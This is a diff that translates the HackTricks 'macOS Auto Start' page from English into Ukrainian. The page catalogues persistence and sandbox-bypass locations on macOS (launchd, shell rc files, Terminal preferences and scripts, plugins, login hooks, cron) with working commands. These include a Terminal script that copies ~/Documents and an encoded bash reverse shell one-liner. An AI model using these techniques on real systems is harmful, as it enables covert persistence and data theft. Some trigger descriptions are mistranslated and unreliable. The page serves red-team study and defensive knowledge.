@@ -1,230 +1,218 @@
-# macOS Auto Start
+# Автозапуск macOS
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у PDF** Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.
 
 </details>
 
-This section is heavily based on the blog series [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), the goal is to add **more Autostart Locations** (if possible), indicate **which techniques are still working** nowadays with latest version of macOS (13.4) and to specify the **permissions** needed.
+Цей розділ сильно ґрунтується на блозі [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), мета - додати **більше місць автозапуску** (якщо можливо), вказати **які техніки все ще працюють** в наш час з останньою версією macOS (13.4) та уточнити **необхідні дозволи**.
 
-## Sandbox Bypass
+## Обхід пісочниці
 
 {% hint style="success" %}
-Here you can find start locations useful for **sandbox bypass** that allows you to simply execute something by **writing it into a file** and **waiting** for a very **common** **action**, a determined **amount of time** or an **action you can usually perform** from inside a sandbox without needing root permissions.
+Тут ви можете знайти місця запуску, корисні для **обходу пісочниці**, що дозволяють вам просто виконати щось, **записавши це в файл** та **чекаючи** на дуже **загальну дію**, визначений **час** або **дію, яку ви зазвичай можете виконати** зсередини пісочниці без необхідності кореневих дозволів.
 {% endhint %}
 
 ### Launchd
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-* TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)
+* Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Locations
+#### Місця
 
 * **`/Library/LaunchAgents`**
-  * **Trigger**: Reboot
-  * Root required
+* **Тригер**: Перезавантаження
+* Потрібен корінь
 * **`/Library/LaunchDaemons`**
-  * **Trigger**: Reboot
-  * Root required
+* **Тригер**: Перезавантаження
+* Потрібен корінь
 * **`/System/Library/LaunchAgents`**
-  * **Trigger**: Reboot
-  * Root required
+* **Тригер**: Перезавантаження
+* Потрібен корінь
 * **`/System/Library/LaunchDaemons`**
-  * **Trigger**: Reboot
-  * Root required
+* **Тригер**: Перезавантаження
+* Потрібен корінь
 * **`~/Library/LaunchAgents`**
-  * **Trigger**: Relog-in
+* **Тригер**: Перезавантаження
 * **`~/Library/LaunchDemons`**
-  * **Trigger**: Relog-in
+* **Тригер**: Перезавантаження
 
-#### Description & Exploitation
+#### Опис та Експлуатація
 
-**`launchd`** is the **first** **process** executed by OX S kernel at startup and the last one to finish at shut down. It should always have the **PID 1**. This process will **read and execute** the configurations indicated in the **ASEP** **plists** in:
+**`launchd`** - це **перший** **процес**, який виконується ядром OX S при запуску та останній, що завершується при вимкненні. Він завжди повинен мати **PID 1**. Цей процес буде **читати та виконувати** конфігурації, вказані в **ASEP** **plists** в:
 
-* `/Library/LaunchAgents`: Per-user agents installed by the admin
-* `/Library/LaunchDaemons`: System-wide daemons installed by the admin
-* `/System/Library/LaunchAgents`: Per-user agents provided by Apple.
-* `/System/Library/LaunchDaemons`: System-wide daemons provided by Apple.
+* `/Library/LaunchAgents`: Агенти для користувача, встановлені адміністратором
+* `/Library/LaunchDaemons`: Демони для всієї системи, встановлені адміністратором
+* `/System/Library/LaunchAgents`: Агенти для користувача, надані Apple.
+* `/System/Library/LaunchDaemons`: Демони для всієї системи, надані Apple.
 
-When a user logs in the plists located in `/Users/$USER/Library/LaunchAgents` and `/Users/$USER/Library/LaunchDemons` are started with the **logged users permissions**.
+Коли користувач увійшов у систему, plists, розташовані в `/Users/$USER/Library/LaunchAgents` та `/Users/$USER/Library/LaunchDemons`, запускаються з **дозволами ввійшовших користувачів**.
 
-The **main difference between agents and daemons is that agents are loaded when the user logs in and the daemons are loaded at system startup** (as there are services like ssh that needs to be executed before any user access the system). Also agents may use GUI while daemons need to run in the background.
-
+**Основна різниця між агентами та демонами полягає в тому, що агенти завантажуються при вході користувача, а демони завантажуються при запуску системи** (оскільки є служби, такі як ssh, які потрібно виконати до того, як будь-який користувач отримає доступ до системи). Крім того, агенти можуть використовувати GUI, тоді як демони повинні працювати в фоновому режимі.
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
 <plist version="1.0">
 <dict>
-    <key>Label</key>
-        <string>com.apple.someidentifier</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
-    </array>
-    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
-    <key>StartInterval</key>
-    <integer>800</integer> <!--Execute each 800s-->
-    <key>KeepAlive</key>
-    <dict>
-        <key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
-        <!--If previous is true, then re-execute in successful exit-->
-    </dict>
+<key>Label</key>
+<string>com.apple.someidentifier</string>
+<key>ProgramArguments</key>
+<array>
+<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
+</array>
+<key>RunAtLoad</key><true/> <!--Execute at system startup-->
+<key>StartInterval</key>
+<integer>800</integer> <!--Execute each 800s-->
+<key>KeepAlive</key>
+<dict>
+<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
+<!--If previous is true, then re-execute in successful exit-->
+</dict>
 </dict>
 </plist>
 ```
-
-There are cases where an **agent needs to be executed before the user logins**, these are called **PreLoginAgents**. For example, this is useful to provide assistive technology at login. They can be found also in `/Library/LaunchAgents`(see [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) an example).
+Є випадки, коли **агент потрібно виконати до входу користувача**, їх називають **PreLoginAgents**. Наприклад, це корисно для надання технологій допомоги при вході. Їх також можна знайти в `/Library/LaunchAgents` (див. [**тут**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) приклад).
 
 {% hint style="info" %}
-New Daemons or Agents config files will be **loaded after next reboot or using** `launchctl load <target.plist>` It's **also possible to load .plist files without that extension** with `launchctl -F <file>` (however those plist files won't be automatically loaded after reboot).\
-It's also possible to **unload** with `launchctl unload <target.plist>` (the process pointed by it will be terminated),
+Нові файли конфігурації служб або агентів будуть **завантажені після наступного перезавантаження або за допомогою** `launchctl load <target.plist>`. Також можна **завантажити файли .plist без цього розширення** за допомогою `launchctl -F <file>` (проте ці файли plist не будуть автоматично завантажені після перезавантаження).\
+Також можна **відвантажити** за допомогою `launchctl unload <target.plist>` (процес, на який він вказує, буде завершено),
 
-To **ensure** that there isn't **anything** (like an override) **preventing** an **Agent** or **Daemon** **from** **running** run: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
+Щоб **забезпечити**, що нічого (наприклад, перевизначення) **не перешкоджає** **Агенту** або **Демону** **запускатися**, виконайте: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
 {% endhint %}
 
-List all the agents and daemons loaded by the current user:
-
+Перелічити всі агенти та демони, завантажені поточним користувачем:
 ```bash
 launchctl list
 ```
-
 {% hint style="warning" %}
-If a plist is owned by a user, even if it's in a daemon system wide folders, the **task will be executed as the user** and not as root. This can prevent some privilege escalation attacks.
+Якщо plist належить користувачеві, навіть якщо він знаходиться в системних папках демонів, **задача буде виконана як користувач**, а не як root. Це може запобігти деяким атакам на підвищення привілеїв.
 {% endhint %}
 
-### shell startup files
+### Файли запуску оболонки
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
-Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)
+Опис: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
+Опис (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-* TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
-  * But you need to find an app with a TCC bypass that executes a shell that loads these files
+* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
+* Але вам потрібно знайти додаток з обхідом TCC, який виконує оболонку, що завантажує ці файли
 
-#### Locations
+#### Місця
 
 * **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
-  * **Trigger**: Open a terminal with zsh
+* **Спрацьовує**: Відкрити термінал з zsh
 * **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
-  * **Trigger**: Open a terminal with zsh
-  * Root required
+* **Спрацьовує**: Відкрити термінал з zsh
+* Потрібен root
 * **`~/.zlogout`**
-  * **Trigger**: Exit a terminal with zsh
+* **Спрацьовує**: Вийти з терміналу з zsh
 * **`/etc/zlogout`**
-  * **Trigger**: Exit a terminal with zsh
-  * Root required
-* Potentially more in: **`man zsh`**
+* **Спрацьовує**: Вийти з терміналу з zsh
+* Потрібен root
+* Можливо ще в: **`man zsh`**
 * **`~/.bashrc`**
-  * **Trigger**: Open a terminal with bash
-* `/etc/profile` (didn't work)
-* `~/.profile` (didn't work)
+* **Спрацьовує**: Відкрити термінал з bash
+* `/etc/profile` (не працювало)
+* `~/.profile` (не працювало)
 * `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
-  * **Trigger**: Expected to trigger with xterm, but it **isn't installed** and even after installed this error is thrown: xterm: `DISPLAY is not set`
+* **Спрацьовує**: Очікується спрацювання з xterm, але **він не встановлений** і навіть після встановлення видається помилка: xterm: `DISPLAY is not set`
 
-#### Description & Exploitation
+#### Опис та Використання
 
-When initiating a shell environment such as `zsh` or `bash`, **certain startup files are run**. macOS currently uses `/bin/zsh` as the default shell. This shell is automatically accessed when the Terminal application is launched or when a device is accessed via SSH. While `bash` and `sh` are also present in macOS, they need to be explicitly invoked to be used.
+При ініціалізації середовища оболонки, таких як `zsh` або `bash`, **запускаються певні файли запуску**. В macOS наразі використовується `/bin/zsh` як оболонка за замовчуванням. Ця оболонка автоматично викликається при запуску додатка Термінал або при доступі до пристрою через SSH. Хоча `bash` та `sh` також присутні в macOS, їх потрібно явно викликати для використання.
 
-The man page of zsh, which we can read with **`man zsh`** has a long description of the startup files.
-
+Сторінка man для zsh, яку ми можемо прочитати за допомогою **`man zsh`**, містить довгий опис файлів запуску.
 ```bash
 # Example executino via ~/.zshrc
 echo "touch /tmp/hacktricks" >> ~/.zshrc
 ```
-
-### Re-opened Applications
+### Відкриті програми
 
 {% hint style="danger" %}
-Configuring the indicated exploitation and loging-out and loging-in or even rebooting didn't work for me to execute the app. (The app wasn't being executed, maybe it needs to be running when these actions are performed)
+Налаштування вказаної експлуатації та виходу з системи та повторного входу або навіть перезавантаження не допомогли мені виконати програму. (Програма не запускалася, можливо, вона повинна бути запущена під час виконання цих дій)
 {% endhint %}
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)
+**Опис**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+* Корисно для обхідної пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Location
+#### Місцезнаходження
 
 * **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
-  * **Trigger**: Restart reopening applications
+* **Тригер**: Перезапуск відкриття програм
 
-#### Description & Exploitation
+#### Опис та Експлуатація
 
-All the applications to reopen are inside the plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`
+Усі програми для повторного відкриття знаходяться всередині plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`
 
-So, make the reopen applications launch your own one, you just need to **add your app to the list**.
+Отже, щоб зробити відкриття програм запускати вашу власну, вам просто потрібно **додати вашу програму до списку**.
 
-The UUID can be found listing that directory or with `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`
+UUID можна знайти, перераховуючи цей каталог або за допомогою `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`
 
-To check the applications that will be reopened you can do:
-
+Щоб перевірити програми, які будуть відкриті, ви можете виконати:
 ```bash
 defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
 #or
 plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 ```
-
-To **add an application to this list** you can use:
-
+Для **додавання програми до цього списку** ви можете скористатися:
 ```bash
 # Adding iTerm2
 /usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
-    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
+-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
+-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
+-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
+-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
+~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 ```
+### Налаштування терміналу
 
-### Terminal Preferences
+* Корисно для обхідної пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
+* Термінал використовує дозволи FDA користувача, який його використовує
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-  * Terminal use to have FDA permissions of the user use it
-
-#### Location
+#### Місце
 
 * **`~/Library/Preferences/com.apple.Terminal.plist`**
-  * **Trigger**: Open Terminal
+* **Тригер**: Відкриття терміналу
 
-#### Description & Exploitation
+#### Опис та експлуатація
 
-In **`~/Library/Preferences`** are store the preferences of the user in the Applications. Some of these preferences can hold a configuration to **execute other applications/scripts**.
+У **`~/Library/Preferences`** зберігаються налаштування користувача в додатках. Деякі з цих налаштувань можуть містити конфігурацію для **виконання інших додатків/скриптів**.
 
-For example, the Terminal can execute a command in the Startup:
+Наприклад, термінал може виконати команду при запуску:
 
 <figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>
 
-This config is reflected in the file **`~/Library/Preferences/com.apple.Terminal.plist`** like this:
-
+Ця конфігурація відображена у файлі **`~/Library/Preferences/com.apple.Terminal.plist`** наступним чином:
 ```bash
 [...]
 "Window Settings" => {
-    "Basic" => {
-      "CommandString" => "touch /tmp/terminal_pwn"
-      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
-      "FontAntialias" => 1
-      "FontWidthSpacing" => 1.004032258064516
-      "name" => "Basic"
-      "ProfileCurrentVersion" => 2.07
-      "RunCommandAsShell" => 0
-      "type" => "Window Settings"
-    }
+"Basic" => {
+"CommandString" => "touch /tmp/terminal_pwn"
+"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
+"FontAntialias" => 1
+"FontWidthSpacing" => 1.004032258064516
+"name" => "Basic"
+"ProfileCurrentVersion" => 2.07
+"RunCommandAsShell" => 0
+"type" => "Window Settings"
+}
 [...]
 ```
+Таким чином, якщо plist установок терміналу в системі може бути перезаписаний, то **функціонал `open` може бути використаний для відкриття терміналу та виконання цієї команди**.
 
-So, if the plist of the preferences of the terminal in the system could be overwritten, the the **`open`** functionality can be used to **open the terminal and that command will be executed**.
-
-You can add this from the cli with:
+Ви можете додати це з командного рядка за допомогою:
 
 {% code overflow="wrap" %}
 ```bash
@@ -237,23 +225,22 @@ You can add this from the cli with:
 ```
 {% endcode %}
 
-### Terminal Scripts / Other file extensions
+### Сценарії терміналу / Інші розширення файлів
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-* TCC bypass: [✅](https://emojipedia.org/check-mark-button)
-  * Terminal use to have FDA permissions of the user use it
+* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
+* Термінал використовує права FDA користувача, якщо він його використовує
 
-#### Location
+#### Місце
 
-* **Anywhere**
-  * **Trigger**: Open Terminal
+* **Будь-де**
+* **Тригер**: Відкриття терміналу
 
-#### Description & Exploitation
+#### Опис та Використання
 
-If you create a [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) and opens, the **Terminal application** will be automatically invoked to execute the commands indicated in there. If the Terminal app has some special privileges (such as TCC), your command will be run with those special privileges.
+Якщо ви створите [**`.terminal`** сценарій](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) та відкриєте його, **Додаток Термінал** автоматично буде викликаний для виконання команд, вказаних там. Якщо додаток Термінал має деякі спеціальні привілеї (наприклад, TCC), ваша команда буде виконана з цими спеціальними привілеями.
 
-Try it with:
-
+Спробуйте це:
 ```bash
 # Prepare the payload
 cat > /tmp/test.terminal << EOF
@@ -261,16 +248,16 @@ cat > /tmp/test.terminal << EOF
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-	<key>CommandString</key>
-	<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
-	<key>ProfileCurrentVersion</key>
-	<real>2.0600000000000001</real>
-	<key>RunCommandAsShell</key>
-	<false/>
-	<key>name</key>
-	<string>exploit</string>
-	<key>type</key>
-	<string>Window Settings</string>
+<key>CommandString</key>
+<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
+<key>ProfileCurrentVersion</key>
+<real>2.0600000000000001</real>
+<key>RunCommandAsShell</key>
+<false/>
+<key>name</key>
+<string>exploit</string>
+<key>type</key>
+<string>Window Settings</string>
 </dict>
 </plist>
 EOF
@@ -281,49 +268,48 @@ open /tmp/test.terminal
 # Use something like the following for a reverse shell:
 <string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
 ```
-
-You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.
+Ви також можете використовувати розширення **`.command`**, **`.tool`**, зі звичайним вмістом оболонки, і вони також будуть відкриватися за допомогою Терміналу.
 
 {% hint style="danger" %}
-If terminal has **Full Disk Access** it will be able to complete that action (note that the command executed will be visible in a terminal window).
+Якщо у терміналі є **Повний доступ до диска**, він зможе завершити цю дію (зверніть увагу, що виконана команда буде видима у вікні терміналу).
 {% endhint %}
 
-### Audio Plugins
+### Аудіо-плагіни
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
-Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
+Опис: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
+Опис: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-* TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
-  * You might get some extra TCC access
+* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Обхід TCC: [🟠](https://emojipedia.org/large-orange-circle)
+* Можливо отримати додатковий доступ TCC
 
-#### Location
+#### Місцезнаходження
 
 * **`/Library/Audio/Plug-Ins/HAL`**
-  * Root required
-  * **Trigger**: Restart coreaudiod or the computer
+* Потрібні права адміністратора
+* **Спуск**: Перезапустіть coreaudiod або комп'ютер
 * **`/Library/Audio/Plug-ins/Components`**
-  * Root required
-  * **Trigger**: Restart coreaudiod or the computer
+* Потрібні права адміністратора
+* **Спуск**: Перезапустіть coreaudiod або комп'ютер
 * **`~/Library/Audio/Plug-ins/Components`**
-  * **Trigger**: Restart coreaudiod or the computer
+* **Спуск**: Перезапустіть coreaudiod або комп'ютер
 * **`/System/Library/Components`**
-  * Root required
-  * **Trigger**: Restart coreaudiod or the computer
+* Потрібні права адміністратора
+* **Спуск**: Перезапустіть coreaudiod або комп'ютер
 
-#### Description
+#### Опис
 
-According to the previous writeups it's possible to **compile some audio plugins** and get them loaded.
+Згідно з попередніми описами, можна **скомпілювати деякі аудіо-плагіни** та завантажити їх.
 
-### QuickLook Plugins
+### Плагіни QuickLook
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)
+Опис: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-* TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
-  * You might get some extra TCC access
+* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Обхід TCC: [🟠](https://emojipedia.org/large-orange-circle)
+* Можливо отримати додатковий доступ TCC
 
-#### Location
+#### Місцезнаходження
 
 * `/System/Library/QuickLook`
 * `/Library/QuickLook`
@@ -331,30 +317,29 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.
 * `/Applications/AppNameHere/Contents/Library/QuickLook/`
 * `~/Applications/AppNameHere/Contents/Library/QuickLook/`
 
-#### Description & Exploitation
+#### Опис та Використання
 
-QuickLook plugins can be executed when you **trigger the preview of a file** (press space bar with the file selected in Finder) and a **plugin supporting that file type** is installed.
+Плагіни QuickLook можуть бути виконані, коли ви **запускаєте попередній перегляд файлу** (натисніть пробіл з вибраним файлом у Finder) і встановлений **плагін, що підтримує цей тип файлу**.
 
-It's possible to compile your own QuickLook plugin, place it in one of the previous locations to load it and then go to a supported file and press space to trigger it.
+Можливо скомпілювати власний плагін QuickLook, розмістити його в одному з попередніх місць для завантаження і потім перейти до підтримуваного файлу та натиснути пробіл для його запуску.
 
-### ~~Login/Logout Hooks~~
+### ~~Гачки входу/виходу~~
 
 {% hint style="danger" %}
-This didn't work for me, neither with the user LoginHook nor with the root LogoutHook
+Це не працювало для мене, ні з гачком входу користувача, ні з гачком виходу кореневого користувача
 {% endhint %}
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)
+**Опис**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+* Корисно для обхіду пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Location
+#### Місцезнаходження
 
-* You need to be able to execute something like `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
-  * `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`
+* Вам потрібно мати можливість виконати щось на зразок `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
+* Розташовано в `~/Library/Preferences/com.apple.loginwindow.plist`
 
-They are deprecated but can be used to execute commands when a user logs in.
-
+Вони застарілі, але можуть бути використані для виконання команд при вході користувача.
 ```bash
 cat > $HOME/hook.sh << EOF
 #!/bin/bash
@@ -364,98 +349,86 @@ chmod +x $HOME/hook.sh
 defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
 defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
 ```
-
-This setting is stored in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
-
+Цей параметр зберігається в `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
 ```bash
 defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
 {
-    LoginHook = "/Users/username/hook.sh";
-    LogoutHook = "/Users/username/hook.sh";
-    MiniBuddyLaunch = 0;
-    TALLogoutReason = "Shut Down";
-    TALLogoutSavesState = 0;
-    oneTimeSSMigrationComplete = 1;
+LoginHook = "/Users/username/hook.sh";
+LogoutHook = "/Users/username/hook.sh";
+MiniBuddyLaunch = 0;
+TALLogoutReason = "Shut Down";
+TALLogoutSavesState = 0;
+oneTimeSSMigrationComplete = 1;
 }
 ```
-
-To delete it:
-
+Щоб видалити це:
 ```bash
 defaults delete com.apple.loginwindow LoginHook
 defaults delete com.apple.loginwindow LogoutHook
 ```
+Користувач root зберігається в **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**
 
-The root user one is stored in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**
-
-## Conditional Sandbox Bypass
+## Умовне уникнення пісочниці
 
 {% hint style="success" %}
-Here you can find start locations useful for **sandbox bypass** that allows you to simply execute something by **writing it into a file** and **expecting not super common conditions** like specific **programs installed, "uncommon" user** actions or environments.
+Тут ви можете знайти місця запуску, корисні для **унікального уникнення пісочниці**, що дозволяє вам просто виконати щось, **записавши це в файл** та **очікуючи не дуже поширених умов**, таких як конкретні **встановлені програми, "незвичайні" дії користувача** або середовища.
 {% endhint %}
 
 ### Cron
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)
+**Опис**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)
 
-* Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
-  * However, you need to be able to execute `crontab` binary
-  * Or be root
-* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+* Корисно для обходу пісочниці: [✅](https://emojipedia.org/check-mark-button)
+* Однак вам потрібно мати можливість виконати бінарний файл `crontab`
+* Або бути root
+* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Location
+#### Місце
 
 * **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
-  * Root required for direct write access. No root required if you can execute `crontab <file>`
-  * **Trigger**: Depends on the cron job
+* Потрібен root для прямого запису. Root не потрібен, якщо ви можете виконати `crontab <файл>`
+* **Тригер**: Залежить від роботи cron
 
-#### Description & Exploitation
+#### Опис та експлуатація
 
-List the cron jobs of the **current user** with:
-
+Перелічте роботи cron **поточного користувача** за допомогою:
 ```bash
 crontab -l
 ```
+Ви також можете побачити всі cron-завдання користувачів у **`/usr/lib/cron/tabs/`** та **`/var/at/tabs/`** (потрібні права root).
 
-You can also see all the cron jobs of the users in **`/usr/lib/cron/tabs/`** and **`/var/at/tabs/`** (needs root).
-
-In MacOS several folders executing scripts with **certain frequency** can be found in:
-
+У MacOS кілька папок, які виконують скрипти з **певною частотою**, можна знайти в:
 ```bash
 # The one with the cron jobs is /usr/lib/cron/tabs/
 ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
 ```
+Тут ви можете знайти звичайні **cron** **завдання**, **at** **завдання** (не дуже використовується) та **періодичні** **завдання** (головним чином використовується для очищення тимчасових файлів). Щоденні періодичні завдання можна виконати, наприклад, за допомогою команди: `periodic daily`.
 
